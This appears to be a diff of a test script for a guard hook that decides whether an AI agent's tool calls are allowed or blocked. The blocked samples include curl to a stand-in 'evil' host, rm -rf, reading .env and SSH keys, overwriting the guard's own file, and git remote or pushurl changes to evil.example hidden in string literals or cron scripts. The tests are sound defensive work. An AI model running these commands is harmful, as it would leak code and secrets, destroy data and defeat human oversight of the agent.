+g "config user.name allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git config user.name x"}}'
+g "remote -v allowed" allow '{"tool_name":"terminal","tool_input":{"command":"git remote -v"}}'
 g "gh pr create refused"                    block '{"tool_name":"terminal","tool_input":{"command":"gh pr create --fill"}}'
 g "gh.exe pr create refused"                block '{"tool_name":"terminal","tool_input":{"command":"gh.exe pr create --fill"}}'
 g "network curl refused"                    block '{"tool_name":"terminal","tool_input":{"command":"curl http://evil/x"}}'
@@ -754,6 +1039,8 @@ g "execute_code: rm -rf refused"     block '{"tool_name":"execute_code","tool_in
 g "execute_code: secret path refused" block '{"tool_name":"execute_code","tool_input":{"code":"print(open(\"/x/.env\").read())"}}'
 g "execute_code: guard path refused" block "{\"tool_name\":\"execute_code\",\"tool_input\":{\"code\":\"open('$H/agent-hooks/parity_guard.py','w')\"}}"
 g "execute_code: git push refused (untrusted engine)" block '{"tool_name":"execute_code","tool_input":{"code":"import subprocess\nsubprocess.run(\"git push origin x\", shell=True)"}}'
+g "execute_code: set-url in a string literal refused (HIMMEL-844 r4)" block '{"tool_name":"execute_code","tool_input":{"code":"c = \"git remote set-url origin https://evil.example/x\""}}'
+g "execute_code: sh -c pushurl in a list literal refused (HIMMEL-844 r4)" block '{"tool_name":"execute_code","tool_input":{"code":"import subprocess\nsubprocess.run([\"sh\",\"-c\",\"git config remote.origin.pushurl https://evil.example/x\"])"}}'
 g "execute_code: benign code allowed" allow '{"tool_name":"execute_code","tool_input":{"code":"print(sum(range(10)))"}}'
 g "browser_exec: ssh path refused" block '{"tool_name":"browser_exec","tool_input":{"code":"fetch(\"file:///x/.ssh/id_rsa\")"}}'
 g "browser_exec: benign allowed" allow '{"tool_name":"browser_exec","tool_input":{"code":"document.title"}}'
@@ -761,6 +1048,7 @@ g "browser_cdp: secret path in params refused" block '{"tool_name":"browser_cdp"
 g "process_manage: destructive data refused" block '{"tool_name":"process_manage","tool_input":{"action":"write","session_id":"s1","data":"rm -rf build\n"}}'
 g "process_manage: poll allowed"  allow '{"tool_name":"process_manage","tool_input":{"action":"poll","session_id":"s1"}}'
 g "cronjob_manage: destructive script refused" block '{"tool_name":"cronjob_manage","tool_input":{"action":"create","schedule":"every 1h","script":"rm -rf build"}}'
+g "cronjob_manage: set-url in a string literal refused (HIMMEL-844 r4)" block '{"tool_name":"cronjob_manage","tool_input":{"action":"create","schedule":"every 1h","script":"x = \"git remote set-url origin https://evil.example/x\""}}'
 g "cronjob_manage: prompt-only job allowed" allow '{"tool_name":"cronjob_manage","tool_input":{"action":"create","schedule":"every 1h","prompt":"summarise the inbox"}}'
 g "skill_manage: create allowed"  allow '{"tool_name":"skill_manage","tool_input":{"action":"create","name":"demo","content":"# demo"}}'
 g "skill_manage: absolute file_path into a repo on master refused" block "{\"tool_name\":\"skill_manage\",\"tool_input\":{\"action\":\"write_file\",\"name\":\"demo\",\"file_path\":\"$MASTR/src/foo.sh\",\"file_content\":\"x\"}}"
